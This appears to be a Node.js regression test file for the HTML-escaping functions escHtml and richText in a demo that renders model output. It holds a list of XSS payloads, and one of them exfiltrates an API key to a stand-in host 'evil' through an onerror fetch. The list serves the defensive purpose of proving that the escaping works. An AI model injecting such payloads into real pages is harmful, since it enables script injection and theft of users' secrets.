// Regression tests for the HTML-escaping used before rendering model output.
//
// The demo ships as a single self-contained HTML file, so rather than import a
// module we extract the actual `escHtml` / `richText` functions from the shipped
// file and exercise them. This guards the security fix that routes all model /
// scenario output through `richText()` instead of injecting raw HTML.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';

const here = dirname(fileURLToPath(import.meta.url));
// Read the source module (unminified); the shipped HTML is built from it.
const html = readFileSync(join(here, '..', 'src', 'app.js'), 'utf8');

function extract(name) {
  // Each helper is defined on a single line: `function name(...){...}`
  const line = html.split('\n').find((l) => l.trimStart().startsWith(`function ${name}(`));
  assert.ok(line, `could not find function ${name} in src/app.js`);
  return line.trim();
}

// Build both functions in one scope (richText depends on escHtml).
const { escHtml, richText } = (function () {
  // eslint-disable-next-line no-eval
  return eval(`(function(){ ${extract('escHtml')} ${extract('richText')} return { escHtml, richText }; })()`);
})();

const XSS = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '"><svg onload=alert(document.domain)>',
  '<iframe src="javascript:alert(1)">',
  "<a href=\"javascript:alert(1)\">x</a>",
  '<style>*{}</style>',
  '<img src=x onerror="fetch(`//evil/`+window.S.apiKey)">',
];

test('escHtml neutralizes angle brackets, quotes and ampersand', () => {
  assert.equal(escHtml('<b>'), '&lt;b&gt;');
  assert.equal(escHtml('a & b'), 'a &amp; b');
  assert.equal(escHtml('"x" \'y\''), '&quot;x&quot; &#39;y&#39;');
  assert.equal(escHtml(null), '');
  assert.equal(escHtml(undefined), '');
});

test('richText preserves **bold** but escapes everything else', () => {
  assert.equal(richText('**hi**'), '<strong>hi</strong>');
  assert.equal(richText('a **b** c'), 'a <strong>b</strong> c');
  // bold around already-dangerous content stays escaped inside the <strong>
  assert.equal(richText('**<b>**'), '<strong>&lt;b&gt;</strong>');
  // lone asterisks are not turned into tags
  assert.equal(richText('2 * 3 * 4'), '2 * 3 * 4');
});

test('richText never emits executable HTML for XSS payloads', () => {
  for (const payload of XSS) {
    const out = richText(payload);
    assert.ok(!/<script/i.test(out), `<script> leaked for: ${payload}`);
    assert.ok(!/<img/i.test(out), `<img> leaked for: ${payload}`);
    assert.ok(!/<svg/i.test(out), `<svg> leaked for: ${payload}`);
    assert.ok(!/<iframe/i.test(out), `<iframe> leaked for: ${payload}`);
    assert.ok(!/<style/i.test(out), `<style> leaked for: ${payload}`);
    // The only tag richText is ever allowed to introduce is <strong>. Because the
    // angle brackets of any injected markup are escaped, leftover text like
    // "onerror=" is inert — what matters is that no real tag (other than
    // <strong>) survives, which this check enforces.
    const tags = out.match(/<[^>]+>/g) || [];
    for (const t of tags) {
      assert.ok(/^<\/?strong>$/.test(t), `unexpected tag ${t} for: ${payload}`);
    }
  }
});

test('escaping is applied before bold so injected markup cannot wrap real tags', () => {
  // A payload that tries to smuggle a tag via the bold delimiters
  const out = richText('**<img src=x onerror=alert(1)>**');
  assert.ok(out.startsWith('<strong>') && out.endsWith('</strong>'));
  assert.ok(!/<img/i.test(out));
  // the angle brackets are escaped, so the <img> never becomes a real tag
  assert.ok(out.includes('&lt;img'));
});
